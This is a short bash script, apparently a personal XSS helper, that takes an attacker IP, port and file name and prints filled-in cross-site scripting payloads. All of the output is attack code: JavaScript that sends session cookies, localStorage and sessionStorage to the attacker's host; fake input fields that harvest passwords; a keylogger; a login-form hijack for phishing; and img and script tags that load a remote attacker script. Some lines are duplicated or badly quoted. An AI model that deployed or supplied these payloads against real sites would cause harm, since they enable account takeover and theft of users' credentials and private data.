#!/bin/bash
echo "---------------------------------"
echo "  XSS Program Designed By Cuong  "
echo "---------------------------------"
echo
echo

# Prompt for IP address and Port
read -p "[?] Enter the IP address: " IP
read -p "[?] Enter the Port: " PORT
read -p "[?] Enter the File: " FILE
echo
echo

# Displaying headers and corresponding JavaScript snippets
echo -e "\033[31m[!] Steal Session Cookies:\033[0m"
echo "let cookie = document.cookie"
echo "let encodedCookie = encodeURIComponent(cookie)"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedCookie)"
echo

echo -e "\033[31m[!] Steal Session Passwords:\033[0m"

echo "let body = document.getElementsByTagName('body')[0];"
echo "var u = document.createElement('input');"
echo "u.type = 'text';"
echo "u.style.position = 'fixed';"
echo "//u.style.opacity = '0';"
echo "var p = document.createElement('input');"
echo "p.type = 'password';"
echo "p.style.position = 'fixed';"
echo "//p.style.opacity = '0';"
echo "body.append(u);"
echo "body.append(p);"
echo "setTimeout(function(){"
echo "fetch('http://$IP:$PORT/k?u=' + u.value + '&p=' + p.value)"
echo "}, 5000);"
echo

echo -e "\033[31m[!] Steal Local Secrets (Local Storage):\033[0m"

echo "let data = JSON.stringify(localStorage);"
echo "let encodedData = encodeURIComponent(data);"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedData)"
echo

echo -e "\033[31m[!] Steal Local Secrets(Session Storage):\033[0m"

echo "let data = JSON.stringify(sessionStorage);"
echo "let encodedData = encodeURIComponent(data);"
echo "fetch(\"http://$IP:$PORT/exfil?data=\" + encodedData)"
echo

echo -e "\033[31m[!] XSS Payload 1:\033[0m"

echo "<img src='x' onerror='src=\"http://$IP:$PORT/$FILE\"'>"
echo

echo -e "\033[31m[!] XSS Payload 2:\033[0m"

echo "<img src='x' onerror='const script = document.createElement(\"script\"); script.src=\"http://$IP:$PORT/$FILE\";script.async = true;console.log(\"Script Loaded\");document.body.appendChild(script);'>"
echo
echo -e "\033[31m[!] XSS Payload 3:\033[0m"

echo "<script src="http://$IP:$PORT/$FILE"></script>"
echo
echo -e "\033[31m[!] XSS Payload 4:\033[0m"

echo "<script src="http://$IP:$PORT/$FILE"></script>"
echo
echo -e "\033[31m[!] Keylogger:\033[0m"

echo "function logKey(event){  
fetch("http://$IP:$PORT/k?key=" + event.key)  
}
document.addEventListener('keydown', logKey);
"
echo -e "\033[31m[!] Phish:\033[0m"

echo "fetch('/search/login').then(res => res.text().then(data => {
document.getElementsByTagName("html")[0].innerHTML = data
document.getElementsByTagName("form")[0].action = [http://$IP](http://$IP)'
document.getElementsByTagName("form")[0].method = 'get'
}))
"
echo
